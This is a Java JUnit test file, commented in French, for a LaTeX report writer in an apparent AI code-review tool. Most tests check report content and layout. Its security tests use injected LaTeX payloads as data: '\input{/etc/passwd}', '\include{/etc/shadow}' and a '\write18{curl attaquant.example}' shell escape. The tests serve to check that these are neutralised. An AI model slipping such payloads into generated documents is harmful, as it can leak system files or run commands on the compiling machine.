package com.reviewerai.report;

import com.reviewerai.model.CodeLocation;
import com.reviewerai.model.CriterionResult;
import com.reviewerai.model.EvaluationResult;
import com.reviewerai.model.Finding;
import com.reviewerai.model.ProjectRef;
import com.reviewerai.model.Severity;
import com.reviewerai.model.SourceKind;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.nio.file.Path;
import java.time.Duration;
import java.time.Instant;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests du rendu LaTeX.
 *
 * <p>Deux familles de vérifications, d'importance très inégale : le document contient-il ce que
 * le sujet exige, et surtout — le texte venant du modèle peut-il en sortir pour se faire
 * exécuter par le compilateur.
 */
class LatexReportWriterTest {

    private static final ProjectRef PROJECT =
            new ProjectRef("demo", Path.of("/tmp/demo"), SourceKind.GIT, "a1b2c3d4e5f6");

    private final LatexReportWriter writer = new LatexReportWriter();

    private static CriterionResult criterion(String id, String label, int score) {
        return new CriterionResult(id, label, score, 10, "Appréciation générale.",
                List.of("un point fort"), List.of("un point faible"), List.of("une recommandation"),
                List.of(), true);
    }

    private static EvaluationResult result(List<CriterionResult> criteria) {
        return new EvaluationResult(PROJECT, Instant.parse("2026-09-10T12:34:00Z"),
                "qwen2.5-coder:7b", "budget 6000 jetons", criteria,
                Duration.ofSeconds(95), 6, List.of());
    }

    private String render(List<CriterionResult> criteria) {
        return writer.render(result(criteria));
    }

    // --- contenu exigé par le sujet ---

    @Test
    @DisplayName("le document identifie le projet, la date, le modèle et la configuration")
    void documentCarriesTheAnalysisContext() {
        String tex = render(List.of(criterion("a", "Architecture", 8)));

        assertTrue(tex.contains("demo"), "le projet évalué");
        assertTrue(tex.contains("10/09/2026"), "la date d'analyse");
        assertTrue(tex.contains("qwen2.5-coder"), "le modèle interrogé");
        assertTrue(tex.contains("budget 6000 jetons"), "la configuration utilisée");
        assertTrue(tex.contains("a1b2c3d"), "la révision, qui rend l'analyse reproductible");
    }

    @Test
    @DisplayName("le tableau récapitulatif porte une ligne par critère et la note globale")
    void summaryTableListsEveryCriterion() {
        String tex = render(List.of(criterion("a", "Architecture", 8), criterion("b", "Tests", 6)));

        assertTrue(tex.contains("\\begin{longtable}"));
        assertTrue(tex.contains("Architecture & 8 & 10"));
        assertTrue(tex.contains("Tests & 6 & 10"));
        assertTrue(tex.contains("Note globale"));
    }

    @Test
    @DisplayName("la note globale est écrite à la française")
    void overallScoreUsesFrenchDecimalSeparator() {
        String tex = render(List.of(criterion("a", "Architecture", 7)));

        assertTrue(tex.contains("14,0"), "7/10 vaut 14/20 ; le séparateur doit être une virgule");
    }

    @Test
    @DisplayName("chaque critère a sa section avec forces, faiblesses et recommandations")
    void everyCriterionHasItsSection() {
        String tex = render(List.of(criterion("a", "Architecture", 8)));

        assertTrue(tex.contains("\\section{Architecture — 8/10}"));
        assertTrue(tex.contains("Points forts"));
        assertTrue(tex.contains("Points faibles"));
        assertTrue(tex.contains("Recommandations"));
        assertTrue(tex.contains("un point fort"));
    }

    @Test
    @DisplayName("les signalements apparaissent avec leur gravité et leur emplacement")
    void findingsAreLocated() {
        var withFinding = new CriterionResult("a", "Sécurité", 4, 10, "",
                List.of(), List.of(), List.of(),
                List.of(new Finding(new CodeLocation("src/A.java", "A#run", 42),
                        Severity.HIGH, "Ressource non fermée", "Le flux reste ouvert.", 0.9)),
                true);

        String tex = render(List.of(withFinding));

        assertTrue(tex.contains("HIGH"));
        assertTrue(tex.contains("src/A.java:42"));
        assertTrue(tex.contains("Ressource non fermée"));
    }

    @Test
    @DisplayName("un critère non évalué figure dans le document, avec son motif")
    void unevaluatedCriterionIsShownWithItsReason() {
        var failed = CriterionResult.failed("b", "Lisibilité", 10, "délai dépassé");

        String tex = render(List.of(criterion("a", "Architecture", 8), failed));

        assertTrue(tex.contains("Critères non évalués"));
        assertTrue(tex.contains("Lisibilité"));
        assertTrue(tex.contains("délai dépassé"));
        assertTrue(tex.contains("n'entrent pas dans la note globale"),
                "le lecteur doit savoir que la note porte sur une partie du barème");
    }

    @Test
    @DisplayName("un critère non évalué apparaît sans note dans le tableau")
    void unevaluatedCriterionHasNoScoreInTheTable() {
        String tex = render(List.of(CriterionResult.failed("b", "Lisibilité", 10, "panne")));

        assertTrue(tex.contains("Lisibilité & --- & ---"),
                "afficher son maximum ferait croire à une erreur de calcul dans le total");
    }

    // --- sécurité : le point critique ---

    @Test
    @DisplayName("une commande de lecture de fichier glissée par le modèle est neutralisée")
    void fileReadingCommandIsNeutralised() {
        var hostile = new CriterionResult("a", "Architecture", 8, 10,
                "\\input{/etc/passwd}", List.of("\\include{/etc/shadow}"), List.of(), List.of(),
                List.of(), true);

        String tex = writer.render(result(List.of(hostile)));

        assertFalse(tex.contains("\\input{/etc/passwd}"),
                "LaTeX lirait le fichier et le recopierait dans le PDF produit");
        assertFalse(tex.contains("\\include{/etc/shadow}"));
    }

    @Test
    @DisplayName("une tentative d'exécution système est neutralisée")
    void shellEscapeIsNeutralised() {
        var hostile = new CriterionResult("a", "Architecture", 8, 10,
                "\\write18{curl attaquant.example}", List.of(), List.of(), List.of(), List.of(), true);

        assertFalse(writer.render(result(List.of(hostile))).contains("\\write18{"));
    }

    @Test
    @DisplayName("un nom de projet hostile est échappé lui aussi")
    void projectNameIsEscapedToo() {
        var project = new ProjectRef("\\input{/etc/passwd}", Path.of("/tmp/x"), SourceKind.DIRECTORY, "");
        var evaluation = new EvaluationResult(project, Instant.now(), "modele", "config",
                List.of(criterion("a", "Architecture", 8)), Duration.ZERO, 0, List.of());

        assertFalse(writer.render(evaluation).contains("\\input{/etc/passwd}"),
                "aucun champ n'est réputé de confiance, pas même le nom du projet");
    }

    // --- validité du document produit ---

    @Test
    @DisplayName("les environnements ouverts sont tous refermés")
    void environmentsAreBalanced() {
        String tex = render(List.of(criterion("a", "Architecture", 8),
                CriterionResult.failed("b", "Lisibilité", 10, "panne")));

        for (String environment : List.of("document", "itemize", "longtable", "tabular", "center")) {
            assertEquals(count(tex, "\\begin{" + environment + "}"),
                    count(tex, "\\end{" + environment + "}"),
                    "environnement déséquilibré : " + environment);
        }
    }

    @Test
    @DisplayName("aucune liste à puces n'est vide")
    void noEmptyItemize() {
        // Un critère sans point faible est un cas normal ; un itemize sans item fait échouer
        // la compilation LaTeX. C'est le piège le plus facile à introduire ici.
        var spotless = new CriterionResult("a", "Architecture", 10, 10, "Rien à redire.",
                List.of(), List.of(), List.of(), List.of(), true);

        String tex = writer.render(result(List.of(spotless)));

        Matcher matcher = Pattern.compile("\\\\begin\\{itemize\\}(.*?)\\\\end\\{itemize\\}",
                Pattern.DOTALL).matcher(tex);
        while (matcher.find()) {
            assertTrue(matcher.group(1).contains("\\item"), "itemize vide dans le document produit");
        }
    }

    @Test
    @DisplayName("une valeur de contexte longue peut se replier plutôt que déborder")
    void longContextValueWraps() {
        String tex = render(List.of(criterion("a", "Architecture", 8)));

        // Une colonne « l » prend sa largeur naturelle : la ligne de configuration, longue de
        // plus de cent caractères, sortait de la page et se faisait couper.
        assertTrue(tex.contains("p{0.62\\textwidth}"),
                "la colonne des valeurs doit avoir une largeur bornée");
        assertTrue(tex.contains("\\raggedright"),
                "justifiée, une ligne repliée de deux mots verrait ses espaces étirés");
    }

    @Test
    @DisplayName("le préambule ne charge que des paquets courants")
    void preambleStaysPortable() {
        String tex = render(List.of(criterion("a", "Architecture", 8)));

        assertTrue(tex.startsWith("%"), "le document annonce qu'il est engendré");
        assertTrue(tex.contains("\\documentclass[11pt,a4paper]{article}"));
        for (String pkg : List.of("inputenc", "fontenc", "array", "longtable", "geometry", "hyperref")) {
            assertTrue(tex.contains("{" + pkg + "}"), "paquet manquant : " + pkg);
        }
        assertTrue(tex.trim().endsWith("\\end{document}"));
    }

    @Test
    @DisplayName("un résultat sans aucun critère évalué produit quand même un document valide")
    void fullyFailedEvaluationStillRenders() {
        String tex = render(List.of(CriterionResult.failed("a", "Architecture", 10, "modèle absent")));

        assertTrue(tex.contains("\\begin{document}"));
        assertTrue(tex.trim().endsWith("\\end{document}"));
        assertTrue(tex.contains("0,0"), "aucun critère évalué donne une note globale nulle");
    }

    @Test
    @DisplayName("les incidents rencontrés sont reportés dans le document")
    void warningsAreReported() {
        var evaluation = new EvaluationResult(PROJECT, Instant.now(), "modele", "config",
                List.of(criterion("a", "Architecture", 8)), Duration.ZERO, 0,
                List.of("Fichier illisible : src/B.java"));

        assertTrue(writer.render(evaluation).contains("Fichier illisible"));
    }

    @Test
    @DisplayName("l'extension et le nom du format sont ceux attendus")
    void formatIsAnnounced() {
        assertEquals("tex", writer.fileExtension());
        assertEquals("LaTeX", writer.formatName());
    }

    private static int count(String haystack, String needle) {
        int total = 0;
        int at = haystack.indexOf(needle);
        while (at >= 0) {
            total++;
            at = haystack.indexOf(needle, at + needle.length());
        }
        return total;
    }
}
